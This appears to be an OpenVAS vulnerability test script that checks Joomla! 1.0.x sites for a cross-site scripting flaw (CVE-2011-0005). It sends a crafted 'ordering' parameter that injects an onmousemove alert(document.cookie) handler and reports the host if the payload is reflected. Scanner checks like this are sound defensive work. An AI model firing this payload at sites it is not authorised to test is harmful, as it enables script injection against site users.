###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_xss_vuln.nasl 7019 2017-08-29 11:51:27Z teissa $
#
# Joomla! Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Joomla! versions 1.0.x through 1.0.15";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the
  'ordering' parameter to 'index.php' which allows attackers to execute
  arbitrary HTML and script code on the web server.";
tag_solution = "Upgrade to Joomla! 1.5.22 or later,
  For updates refer to http://www.joomla.org/download.html";
tag_summary = "The host is running Joomla! and is prone to Cross site scripting
  vulnerability.";

if(description)
{
  script_id(801827);
  script_version("$Revision: 7019 $");
  script_tag(name:"last_modification", value:"$Date: 2017-08-29 13:51:27 +0200 (Tue, 29 Aug 2017) $");
  script_tag(name:"creation_date", value:"2011-01-27 07:47:27 +0100 (Thu, 27 Jan 2011)");
  script_cve_id("CVE-2011-0005");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Joomla! Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/64539");
  script_xref(name : "URL" , value : "http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.0.x~15]_cross_site_scripting");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get Joomla Directory
if(!dir = get_dir_from_kb(port:port,app:"joomla")) {
  exit(0);
}

## Construct the Attack Request
url = string(dir, "/index.php?option=com_search&searchword=xss&searchphrase=" +
             "any&ordering=newest%22%20onmousemove=alert%28document.cookie%29"+
             "%20style=position:fixed;top:0;left:0;width:100%;height:100%;%22");

## Try attack and check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, pattern:'onmousemove=alert(document.cookie)',
                   check_header: TRUE)){
  security_message(port);
}
